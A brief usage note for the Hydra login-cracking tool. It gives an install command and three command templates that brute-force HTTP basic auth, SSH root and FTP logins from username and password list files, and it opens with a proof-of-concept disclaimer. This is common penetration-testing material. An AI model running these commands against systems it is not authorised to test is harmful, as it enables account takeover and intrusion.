This tool is a proof of concept code, to give researchers and security
consultants the possibility to show how easy it would be to gain unauthorized
access from remote to a system.

## 1. install

安装

```
sudo apt install -y hydra
```

## 2. use

basic auth

```
hydra <host> -s <port> http-get /[protected_page] -L username.txt -P password.txt -e ns -vV
```

ssh

```
hydra <host> ssh -l root -P password.txt -t 4 -e ns -vV
```

ftp

```
hydra <host> ftp -L username.txt -P password.txt -e ns -vV
```

---

Refrences

- [hydra](https://www.kali.org/tools/hydra/)
